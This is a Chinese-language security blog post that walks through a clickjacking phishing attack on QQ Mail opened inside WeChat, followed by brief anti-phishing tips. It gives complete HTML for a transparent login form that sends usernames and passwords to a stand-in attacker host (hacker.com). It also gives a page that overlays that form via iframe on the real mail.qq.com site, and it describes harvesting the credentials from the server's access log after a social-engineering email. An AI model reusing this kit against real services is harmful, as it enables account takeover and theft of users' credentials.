***严正声明：本文仅限于技术讨论与分享，严禁用于非法途径。**

##  ** **前言****

钓鱼攻击一般指钓鱼式攻击。钓鱼式攻击是指企图从电子通讯中，通过伪装成信誉卓著的法人媒体以获得如用户名、密码和信用卡明细等个人敏感信息的犯罪诈骗过程。一些网站存在着诸如html注入、xss、点击劫持等漏洞，这些漏洞因没有实质性的危害往往不被人所重视，本次实验就结合这些漏洞来进行一次账号密码恶意钓鱼，由于技术略菜，大佬勿喷。

##  ** **准备****

为了使受害者更加信任，首先需要一个有点击劫持漏洞的网站来配合完成，因为此次实验环境是手机微信的QQ邮箱提醒功能（通过这个功能可直接从手机微信上查看邮件），所以就去找找相关的资产，首先找到的是QQ邮箱官网，发现可直接被iframe标签嵌套进去：

    
    
    <iframe src="https://mail.qq.com/"></iframe>

![1626070292_60ebdd1449826a63c6c6b.png!small?1626070292347](https://image.3001.net/images/20210712/1626070292_60ebdd1449826a63c6c6b.png!small?1626070292347)

![1626070306_60ebdd2225baccd971dd8.png!small?1626070306206](https://image.3001.net/images/20210712/1626070306_60ebdd2225baccd971dd8.png!small?1626070306206)

表明可利用于点击劫持，然后继续构造html代码，下一步先需要准备一台vps，并且开启web服务，将写好的点击劫持文件放在web目录。直接上代码：

    
    
    <!DOCTYPE html>
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <title></title>
    </head>
    <body>
        <div style="width:300px; height:200px;position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%)">
    	<form name="login" action="http://hacker.com/1.html">
           <input style="width: 286px;height:40px;" type="text" name="username"/>
           <br />
           <input style="width: 286px;height:40px;" type="text" name="password"/><br />
           <br />
           <br />
           <br />
           <input style="width: 286px;height:40px;opacity:0.5" type="submit" value=""/>
        </form>
    </div>
    </body>
    </html>

将上述代码保存为login.html文件放在web目录，需要注意的是style需要根据实际情况调整，opacity一会要设置为0，先看下效果：

![1626070435_60ebdda34f8d0d77f2729.png!small?1626070435338](https://image.3001.net/images/20210712/1626070435_60ebdda34f8d0d77f2729.png!small?1626070435338)

OK，钓鱼页面就先构造成这样，然后构造主页面，就是受害者访问所看到的页面，直接上代码：

    
    
    <html>
    <head>
      <title>登陆</title>
    </head>
    <body>
    <iframe src="https://mail.qq.com/" style="width:1440px;height:900px;position:absolute;top:-0px;left:-0px;opacity:1;"></iframe>
    <iframe src="http://hacker.com/login.html" style="width:640px;height:640px;position:absolute;top:-0;left:700px;opacity:1;"></iframe>
    </body>
    </html>

第一个iframe标签里是真正的QQ邮箱页面，第二个是钓鱼页面，将钓鱼页面放在第二个是因为，经测试浏览器会优先加载最后一个iframe标签，第一个只是可以看到不能进行任何操作，现将opacity设置0.5看下效果：

![1626070534_60ebde06677b6ff7d9ec9.png!small?1626070534481](https://image.3001.net/images/20210712/1626070534_60ebde06677b6ff7d9ec9.png!small?1626070534481)

  

将opacity设为0的话，按钮就会彻底透明，点击登陆时会被钓鱼。

代码写的确实不精湛，无所谓，实现功能才是这次的目的，当受害者输入账号密码点击登陆时，其实点击的是我们构造的钓鱼页面，在第一段代码中我们构造了一个登陆get请求表单，当受害者提交登陆请求的时候实际上的操作为/1.html?username=xxx&password=xxx而参数会记录在日志中，这样就可以窃取远程受害者的输入内容：

![1626070697_60ebdea92ca19e1eec5a2.png!small?1626070697322](https://image.3001.net/images/20210712/1626070697_60ebdea92ca19e1eec5a2.png!small?1626070697322)

第二段实际上是点击劫持漏洞利用，利用视觉上的欺骗进行劫持操作：

![1626070715_60ebdebbaf161d53a83c8.png!small?1626070715850](https://image.3001.net/images/20210712/1626070715_60ebdebbaf161d53a83c8.png!small?1626070715850)

在测试中发现手机访问的时候并不是https://mail.qq.com这个域名，而手机网页版的地址是：https://w.mail.qq.com，最终代码为：

![1626070736_60ebded02ca4abaa8826a.png!small?1626070736327](https://image.3001.net/images/20210712/1626070736_60ebded02ca4abaa8826a.png!small?1626070736327)

##  ** **漏洞利用****

终于来到了漏洞利用，偶然间发现如果直接发送测试html代码，微信的QQ邮箱会解析：

![1626070807_60ebdf1730943cde795c2.png!small?1626070807298](https://image.3001.net/images/20210712/1626070807_60ebdf1730943cde795c2.png!small?1626070807298)

查看邮件发现已经解析，虽然没有写提交参数，但是action属性涉及到跨域的问题往往无法直接访问指定的URL，所以这里也没有实质性的危害。

然后发送准备好的社工邮件，邮件主题这段话可以忽略不看，不是此次实验的重点～～：

![1626070949_60ebdfa5ed62d068bbdb6.png!small?1626070950551](https://image.3001.net/images/20210712/1626070949_60ebdfa5ed62d068bbdb6.png!small?1626070950551)

从微信上查看邮件

![1626077584_60ebf99009f5bab4deb72.png!small?1626077584292](https://image.3001.net/images/20210712/1626077584_60ebf99009f5bab4deb72.png!small?1626077584292)

我们假设当人员安全意识较低时会点击按钮

![1626077600_60ebf9a050b94dfaee58e.png!small?1626077601291](https://image.3001.net/images/20210712/1626077600_60ebf9a050b94dfaee58e.png!small?1626077601291)

这里进入了网页版，一般能进网页版绝对不下载，进来之后大体上和原始页面没啥区别的（代码能力有限，含请见谅）这是钓鱼页面：

![1626077637_60ebf9c52580dc37e652d.png!small?1626077637333](https://image.3001.net/images/20210712/1626077637_60ebf9c52580dc37e652d.png!small?1626077637333)

以下为真正的页面：

![1626077653_60ebf9d531605212e518c.png!small?1626077653207](https://image.3001.net/images/20210712/1626077653_60ebf9d531605212e518c.png!small?1626077653207)

然后实验继续，输入账号密码：

![1626077667_60ebf9e3737ec380219b9.png!small?1626077667746](https://image.3001.net/images/20210712/1626077667_60ebf9e3737ec380219b9.png!small?1626077667746)

可以看到真正请求的是之前建立的login.html，也就是/1.html?username=xxx&password=xxx

![1626077684_60ebf9f432ed0972be7ef.png!small?1626077684347](https://image.3001.net/images/20210712/1626077684_60ebf9f432ed0972be7ef.png!small?1626077684347)

最后查看apache_access.log发现刚才的请求以及输入的账号密码：

![1626077702_60ebfa06e46186fd5e095.png!small?1626077702973](https://image.3001.net/images/20210712/1626077702_60ebfa06e46186fd5e095.png!small?1626077702973)

## 如何防范网络钓鱼攻击

本次实验就到此结束了，整体来看这次实验做的还是有些鸡肋，比起真正的钓鱼网站还是有差距，希望人人都能提高主动风险防范技巧，共同抵抗钓鱼网站诈骗行为，以下为常见的钓鱼防范：

1、对于普通人来说，认清网址是防止误上钓鱼网站的最重要、最直接的方法，每个网站都有“网址”，而网址中包含的“域名”是不变的。

2、现在的网络钓鱼攻击并未做到主动防御，不过欣慰的是可以看到国内如QQ、微博等软件，开始提醒用户不要打开未知的不可信的链接，防止用户被欺骗。

3、对攻击者而言，建立一个包含登录表单、标题和组织logo的网站是一件非常简单的事情。所以重视用户的安全培训也显得尤为重要。

4、最后给大家一些防范网络钓鱼攻击参考链接：

[网络钓鱼深度防御三要素](https://baijiahao.baidu.com/s?id=1703542559270550465&wfr=spider&for=pc)

[诈骗网站及网络钓鱼防范](http://gd.189.cn/internet/xssl/2011/11/09/11026.htm)

[教大家如何预防“网络钓鱼”](https://jingyan.baidu.com/article/72ee561abc4a2ee16138df1c.html)

